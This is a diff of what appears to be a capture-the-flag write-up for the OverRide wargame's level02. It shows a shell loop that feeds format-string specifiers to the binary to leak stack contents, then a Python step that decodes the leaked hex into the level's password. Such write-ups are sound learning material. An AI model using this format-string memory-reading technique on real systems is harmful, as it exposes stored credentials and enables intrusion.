@@ -38,3 +38,12 @@ As password is stored in the buffer and FSA can be performed, read the stack usi
 level02@OverRide:~$ for i in {0..26}; do python -c "print('%$i\$16lx')" | ./level02 | grep -oE '[a-f0-9]{16}' | tr '\n' ' '; done; echo
 2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 
 ```
+Convert hexadecimal value to ASCII within Python
+```python
+level02@OverRide:~$ python
+Python 2.7.3 (default, Jun 22 2015, 19:33:41)
+[GCC 4.6.3] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> print(bytearray.fromhex("2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d"))
+****************unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
+```
